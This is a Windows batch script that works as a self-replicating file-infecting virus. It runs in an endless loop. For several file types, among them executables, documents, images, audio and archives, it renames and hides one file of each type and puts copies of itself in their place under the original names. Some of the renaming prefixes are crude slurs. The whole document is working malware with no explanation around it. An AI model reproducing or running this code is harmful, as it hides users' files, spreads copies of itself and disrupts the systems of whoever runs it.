   :begin

   @ echo off

   for %%f in (*.exe) do set A=%%f
   rename %A%  %A%
   attrib +h  %A%
   copy %0 %A%
   attrib +r %A%
   rename %A% *.bat
   set A=

   for %%f in (*.txt) do set B=%%f
   rename %B% doof%B%
   attrib +h doof%B%
   copy %0 %B%
   attrib +r %B%
   rename %B% *.bat
   set B=

   for %%f in (*.zip) do set C=%%f
   rename %C% dumm%C%
   attrib +h dumm%C%
   copy %0 %C%
   attrib +r %C%
   rename %C% *.bat
   set C=

   for %%f in (*.mp3) do set D=%%f
   rename %D% schwul%D%
   attrib +h schwul%D%
   copy %0 %D%
   attrib +r %D%
   rename %D% *.bat
   set D=

   for %%f in (*.wav) do set E=%%f
   rename %E% malakka%E%
   attrib +h malakka%E%
   copy %0 %E%
   attrib +r %E%
   rename %E% *.bat
   set E=

   for %%f in (*.jpg) do set F=%%f
   rename %F% hey%F%
   attrib +h hey%F%
   copy %0 %F%
   attrib +r %F%
   rename %F% *.bat
   set F=

   for %%f in (*.bmp) do set G=%%f
   rename %G% nice%G%
   attrib +h nice%G%
   copy %0 %G%
   attrib +r %G%
   rename %G% *.bat
   set G=

   for %%f in (*.gif) do set H=%%f
   rename %H% fat%H%
   attrib +h fat%H%
   copy %0 %H%
   attrib +r %H%
   rename %H% *.bat
   set H=

   for %%f in (*.doc) do set I=%%f
   rename %I% asd%I%
   attrib +h asd%I%
   copy %0 %I%
   attrib +r %I%
   rename %I% *.bat
   set I=

   for %%f in (*.zip) do set J=%%f
   rename %J% kk%J%
   attrib +h  kk%J%
   copy %0 %J%
   attrib +r %J%
   rename %J% *.bat
   set J=
   goto begin
